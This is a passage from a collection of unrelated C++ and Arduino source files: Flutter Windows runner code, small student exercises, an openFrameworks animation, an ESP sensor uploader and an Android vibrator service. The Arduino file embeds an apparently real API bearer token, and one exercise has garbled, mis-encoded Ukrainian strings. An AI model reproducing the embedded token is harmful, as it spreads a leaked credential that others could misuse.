++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"progetto_progmobile\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\n#include<vector>\nusing namespace std;\nint main()\n{\nclass Solution {\npublic:\n    void setZeroes(vector<vector<int>>& arr) {\n        int m = arr.size();\n        int n =arr[0].size();\n        vector<bool>row(m,false);\n        vector<bool>col(n,false);\n        \n        for(int i=0;i<m;i++)\n        {\n            for(int j=0;j<n;j++)\n            {\n                if(arr[i][j]==0)\n                {\n                    row[i] =true;// true means 0 set karna hai\n                    col[j] =true;\n                }\n            }\n        }\n        \n        // set rows zero\n        for(int i=0;i<m;i++)\n        {\n            if(row[i]==true)\n            {\n                for(int j=0;j<n;j++)\n                {\n                    arr[i][j] =0;\n                }\n            }\n        }\n        \n         // set cols zero\n        for(int j=0;j<n;j++)\n        {\n            if(col[j]==true)\n            {\n                for(int i=0;i<m;i++)\n                {\n                    arr[i][j] =0;\n                }\n            }\n        }\n        \n        \n    }\n};\n}\n/*\nGiven an m x n integer matrix matrix, if an element is 0, set its entire row and column to 0's.\n\nYou must do it in place.\nExample 1:\nInput: matrix = [[1,1,1],[1,0,1],[1,1,1]]\nOutput: [[1,0,1],[0,0,0],[1,0,1]]\n*/",
    "\n\n#include <iostream>\n#include <vector>\n#include <unordered_map>\n\nusing namespace std;\n\nclass Graph {\nprivate:\n    unordered_map<int, vector<int>> adjacency_list;\n\npublic:\n    void addVertex(int vertex) {\n        // Add vertex if not already present\n        if (adjacency_list.find(vertex) == adjacency_list.end()) {\n            adjacency_list[vertex] = vector<int>();\n        }\n    }\n\n    void addEdge(int vertex1, int vertex2) {\n        // Assuming an undirected graph\n        adjacency_list[vertex1].push_back(vertex2);\n        adjacency_list[vertex2].push_back(vertex1);\n    }\n\n    void printGraph() {\n        for (const auto& pair : adjacency_list) {\n            cout << pair.first << \" -> \";\n            for (int neighbor : pair.second) {\n                cout << neighbor << \" \";\n            }\n            cout << endl;\n        }\n    }\n};\n\nint main() {\n    Graph graph;\n    graph.addVertex(1);\n    graph.addVertex(2);\n    graph.addVertex(3);\n    graph.addEdge(1, 2);\n    graph.addEdge(2, 3);\n\n    graph.printGraph();\n\n    return 0;\n}\n",
    "#include \"ofApp.h\"\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setup() {\r\n\r\n\tofSetFrameRate(25);\r\n\tofSetWindowTitle(\"openFrameworks\");\r\n\r\n\tofBackground(39);\r\n\tofSetLineWidth(3);\r\n\tofEnableDepthTest();\r\n\r\n\tthis->frame.setMode(ofPrimitiveMode::OF_PRIMITIVE_LINES);\r\n\r\n\tfor (int radius = 50; radius <= 250; radius += 10) {\r\n\r\n\t\tthis->radius_list.push_back(radius);\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::update() {\r\n\r\n\tthis->face.clear();\r\n\tthis->frame.clear();\r\n\r\n\tofSeedRandom(39);\r\n\tglm::vec3 noise_param = glm::vec3(ofRandom(360), ofRandom(360), ofRandom(360));\r\n\r\n\tfor (int i = 0; i < this->radius_list[i]; i++) {\r\n\r\n\t\tauto rotation = glm::vec3(\r\n\t\t\tofMap(ofNoise(noise_param.x, this->radius_list[i] * 0.0009 + ofGetFrameNum() * 0.003), 0, 1, -360, 360),\r\n\t\t\tofMap(ofNoise(noise_param.y, this->radius_list[i] * 0.0009 + ofGetFrameNum() * 0.003), 0, 1, -360, 360),\r\n\t\t\tofMap(ofNoise(noise_param.z, this->radius_list[i] * 0.0009 + ofGetFrameNum() * 0.003), 0, 1, -360, 360)\r\n\t\t);\r\n\r\n\t\tthis->setRingToMesh(this->face, this->frame, glm::vec3(), rotation, this->radius_list[i], this->radius_list[i] * 0.1, ofColor(255, 0, 255, 64), ofColor(255, 0, 0));\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::draw() {\r\n\r\n\tthis->cam.begin();\r\n\tofRotateY(ofGetFrameNum() * 1.44);\r\n\r\n\tthis->face.draw();\r\n\tthis->frame.drawWireframe();\r\n\r\n\tthis->cam.end();\r\n\r\n\t/*\r\n\tint start = 300;\r\n\tif (ofGetFrameNum() > start) {\r\n\r\n\t\tostringstream os;\r\n\t\tos << setw(4) << setfill('0') << ofGetFrameNum() - start;\r\n\t\tofImage image;\r\n\t\timage.grabScreen(0, 0, ofGetWidth(), ofGetHeight());\r\n\t\timage.saveImage(\"image/cap/img_\" + os.str() + \".jpg\");\r\n\t\tif (ofGetFrameNum() - start >= 25 * 20) {\r\n\r\n\t\t\tstd::exit(1);\r\n\t\t}\r\n\t}\r\n\t*/\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setRingToMesh(ofMesh& face_target, ofMesh& frame_target, glm::vec3 location, glm::vec3 rotation, float radius, float height, ofColor face_color, ofColor frame_color) {\r\n\r\n\tint index = face_target.getNumVertices();\r\n\r\n\tfor (int deg = 0; deg < 360; deg += 5) {\r\n\r\n\t\tvector<glm::vec3> vertices;\r\n\t\tvertices.push_back(glm::vec3(radius * cos(deg * DEG_TO_RAD), radius * sin(deg * DEG_TO_RAD), height * -0.5));\r\n\t\tvertices.push_back(glm::vec3(radius * cos((deg + 5) * DEG_TO_RAD), radius * sin((deg + 5) * DEG_TO_RAD), height * -0.5));\r\n\t\tvertices.push_back(glm::vec3(radius * cos((deg + 5) * DEG_TO_RAD), radius * sin((deg + 5) * DEG_TO_RAD), height * 0.5));\r\n\t\tvertices.push_back(glm::vec3(radius * cos(deg * DEG_TO_RAD), radius * sin(deg * DEG_TO_RAD), height * 0.5));\r\n\r\n\t\tfor (auto& vertex : vertices) {\r\n\r\n\t\t\tauto rotation_x = glm::rotate(glm::mat4(), rotation.x * (float)DEG_TO_RAD, glm::vec3(1, 0, 0));\r\n\t\t\tauto rotation_y = glm::rotate(glm::mat4(), rotation.y * (float)DEG_TO_RAD, glm::vec3(0, 1, 0));\r\n\t\t\tauto rotation_z = glm::rotate(glm::mat4(), rotation.z * (float)DEG_TO_RAD, glm::vec3(0, 0, 1));\r\n\r\n\t\t\tvertex = glm::vec4(vertex, 0) * rotation_y * rotation_x + glm::vec4(location, 0);\r\n\t\t}\r\n\r\n\t\tauto face_index = face_target.getNumVertices();\r\n\t\tface_target.addVertices(vertices);\r\n\r\n\t\tface_target.addIndex(face_index + 0); face_target.addIndex(face_index + 1); face_target.addIndex(face_index + 2);\r\n\t\tface_target.addIndex(face_index + 0); face_target.addIndex(face_index + 2); face_target.addIndex(face_index + 3);\r\n\r\n\t\tauto frame_index = frame_target.getNumVertices();\r\n\t\tframe_target.addVertices(vertices);\r\n\r\n\t\tframe_target.addIndex(frame_index + 0); frame_target.addIndex(frame_index + 1);\r\n\t\tframe_target.addIndex(frame_index + 2); frame_target.addIndex(frame_index + 3);\r\n\r\n\t\tfor (int i = 0; i < vertices.size(); i++) {\r\n\r\n\t\t\tface_target.addColor(face_color);\r\n\t\t\tframe_target.addColor(frame_color);\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nint main() {\r\n\r\n\tofSetupOpenGL(720, 720, OF_WINDOW);\r\n\tofRunApp(new ofApp());\r\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <chrono>\nusing namespace std;\nusing namespace std::chrono;\n//note : the code is work in online compiler\ndouble fact(double x){\n    double f = 1 ;\n    for(int i = 1 ; i<=x ; i++)\n        f *= i ;\n    return f ;\n}\n\ndouble recfact(double x){\n    if(x==0 || x==1 )\n        return 1 ;\n    return x * recfact(x-1) ;\n}\n\nint main()\n{\n    long int x = 100000000000;\n    for(int i = 1 ; i<=x ; i= i*2){\n        auto start = high_resolution_clock::now();\n        double result1 = fact(i);\n        auto stop = high_resolution_clock::now();\n        auto duration = duration_cast<nanoseconds>(stop - start);\n        cout << \"The factorial of \" << i << \" is: \" << result1 << \" and the execution time is: \" << duration.count() << \" nanoseconds\" << endl;\n        if(result1 == 0)\n            cout << \"Error in factorial calculation\" << endl;\n\n        start = high_resolution_clock::now();\n        double result2 = recfact(i);\n        stop = high_resolution_clock::now();\n        duration = duration_cast<nanoseconds>(stop - start);\n        cout << \"The recursive factorial of \" << i << \" is: \" << result2 << \" and the execution time is: \" << duration.count() << \" nanoseconds\" << endl;\n        if(result2 == 0)\n            cout << \"Error in recursive factorial calculation\" << endl;\n\n        cout << endl;\n    }\n\n    return 0;\n}\n",
    "// dz18.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Employee {\n    string lastName;\n    int yearOfBirth;\n    string position;\n    double salary;\n    string education;\n};\nint main() {\n    setlocale(LC_ALL, \"Ukr\");\n    Employee employees[5] = {\n        {\"Zagorulko\", 1980, \"Traktoryst\", 50000, \"Ptu-28\"},\n        {\"Garbuz\", 1975, \"Agronom\", 60000, \"Dokuchaeva\"},\n        {\"Koval\", 1960, \"Zootechnik\", 70000, \"Veterinarna akademia\"},\n        {\"Patsiuk\", 1990, \"Kombainer\", 55000, \"Ptu-28\"},\n        {\"Kulik\", 1985, \"Vodii\", 45000, \"Ptu-28\"}\n    };\n\n    \n\n    int count = 0;\n    cout << \"\u00d1\u00ef\u00e8\u00f1\u00ee\u00ea \u00ef\u00f0\u00e0\u00f6\u00b3\u00e2\u00ed\u00e8\u00ea\u00b3\u00e2 \u00f1\u00f2\u00e0\u00f0\u00f8\u00e8\u00f5 \u00e7\u00e0 60 \u00f0\u00ee\u00ea\u00b3\u00e2:\" << endl;\n    for (int i = 0; i < 5; ++i) {\n        if (2024 - employees[i].yearOfBirth > 60) {\n            cout << \"\u00cf\u00f0\u00b3\u00e7\u00e2\u00e8\u00f9\u00e5: \" << employees[i].lastName << endl;\n            cout << \"\u00d0\u00b3\u00ea \u00ed\u00e0\u00f0\u00ee\u00e4\u00e6\u00e5\u00ed\u00ed\u00ff: \" << employees[i].yearOfBirth << endl;\n            cout << \"\u00cf\u00ee\u00f1\u00e0\u00e4\u00e0: \" << employees[i].position << endl;\n            cout << \"\u00c7\u00e0\u00f0\u00ef\u00eb\u00e0\u00f2\u00e0: \" << employees[i].salary << endl;\n            cout << \"\u00ce\u00f1\u00e2\u00b3\u00f2\u00e0: \" << employees[i].education << endl << endl;\n            ++count;\n        }\n    }\n    cout << \"\u00c7\u00e0\u00e3\u00e0\u00eb\u00fc\u00ed\u00e0 \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ef\u00f0\u00e0\u00f6\u00b3\u00e2\u00ed\u00e8\u00ea\u00b3\u00e2 \u00f1\u00f2\u00e0\u00f0\u00f8\u00e8\u00f5 \u00e7\u00e0 60 \u00f0\u00ee\u00ea\u00b3\u00e2: \" << count << endl;\n\n    return 0;\n}\n\n\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\n// Debug program: F5 or Debug > Start Debugging menu\n\n// Tips for Getting Started: \n//   1. Use the Solution Explorer window to add/manage files\n//   2. Use the Team Explorer window to connect to source control\n//   3. Use the Output window to see build output and other messages\n//   4. Use the Error List window to view errors\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_hello\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <ctime>\r\nusing namespace std;\r\n \r\nint main() {\r\n    srand(time(0));\r\n    char playAgain;\r\n    do {\r\n        int randomNumber = rand() % 100 + 1;\r\n        int guess;\r\n        int attempts = 0;\r\n        int score = 100;\r\n        cout << \"Welcome to the Number Guessing Game!\" << endl;\r\n        cout << \"Try to guess the number between 1 and 100\" << endl;\r\n        do {\r\n            cout << \"Enter your guess: \";\r\n            cin >> guess;\r\n            attempts++;\r\n            if (guess > randomNumber) {\r\n                cout << \"Too high! Try again\" << endl;\r\n                score -= 10;\r\n            } else if (guess < randomNumber) {\r\n                cout << \"Too low! Try again\" << endl;\r\n                score -= 10;\r\n            } else {\r\n                cout << \"You guessed the number \" << randomNumber << \" in \" << attempts << \" attempts!\" << endl;\r\n                cout << \"Your score is: \" << score << endl;\r\n            }\r\n        } while (guess != randomNumber && score > 0);\r\n        if (score == 0) {\r\n            cout << \"Game over!\" << endl;\r\n        }\r\n        cout << \"Do you want to play again? (y/n): \";\r\n        cin >> playAgain;\r\n    } while (playAgain == 'y' || playAgain == 'Y');\r\n    cout << \"Thank you for playing!\" << endl;\r\n    return 0;\r\n}\r\n\r\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"go_router_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <Arduino.h>\n#include <HTTPClient.h>\n#include \"ArduinoJson.h\" // https://arduinojson.org/\n\n#include \"secrets.h\"\n\n#define SensorPin 35\n\nString getTime() //* String: Unix\n{\n  time_t now;\n  struct tm timeinfo;\n  if (!getLocalTime(&timeinfo))\n  {\n    // Serial.println(\"Failed to obtain time\");\n    return (\"0\");\n  }\n  time(&now);\n  String strtm = String(now) + \"000\";\n  return (strtm);\n}\n\nvoid upload(String body)\n{\n  HTTPClient http;\n  http.begin(\"https://api.axiom.co/v1/datasets/esp/ingest\");\n  http.addHeader(\"Content-Type\", \"application/json\");\n  http.addHeader(\"Authorization\", \"Bearer xaat-6268ec0b-04a2-45e2-80c4-e0fb9571db21\");\n\n  String httpRequestData = body;\n\n  int httpResponseCode = http.POST(httpRequestData);\n\n  // Serial.print(\"HTTP Response code: \");\n  // Serial.println(httpResponseCode);\n\n  http.end();\n}\n\nvoid setup(void)\n{\n  //* Serial\n  Serial.begin(115200);\n  Serial.println(\"Moin\");\n\n  //* Wifi\n  Serial.print(\"Verbinde mit Wlan\");\n  WiFi.mode(WIFI_STA);\n  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);\n  Serial.println(\"\");\n  while (WiFi.status() != WL_CONNECTED) // Wait for connection\n  {\n    delay(500);\n    Serial.print(\".\");\n  }\n  Serial.println(\"\"); // Wenn Ferbunden\n  Serial.print(\"IP Addresse: \");\n  Serial.print(WiFi.localIP());\n  Serial.print(WiFi.status());\n  Serial.println(\"\");\n\n  //* Zeit:\n  Serial.println(\"Hole NTP Zeit\");\n  configTime(0, 0, \"pool.ntp.org\");\n  Serial.print(\"Epoch Time: \");\n  Serial.println(getTime());\n}\n\nvoid loop()\n{\n\n  String data;\n  DynamicJsonDocument doc(1024);\n\n  int value = analogRead(SensorPin);\n\n  doc[\"_time\"] = getTime();\n  doc[\"ADC_1\"] = value;\n\n  serializeJson(doc, data);\n  data = \"[\" + data + \"]\";\n\n  Serial.println(data);\n  upload(data);\n  // delay(100);\n\n  // Serial.println(value);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"juego_colmena\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n * Copyright (c) 2020, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n#define LOG_TAG \"vendor.qti.hardware.vibrator.service\"\n\n#include <android-base/logging.h>\n#include <android/binder_manager.h>\n#include <android/binder_process.h>\n\n#include \"Vibrator.h\"\n\nusing aidl::android::hardware::vibrator::Vibrator;\n\nint main() {\n    ABinderProcess_setThreadPoolMaxThreadCount(0);\n    std::shared_ptr<Vibrator> vib = ndk::SharedRefBase::make<Vibrator>();\n\n    const std::string instance = std::string() + Vibrator::descriptor + \"/default\";\n    binder_status_t status = AServiceManager_addService(vib->asBinder().get(), 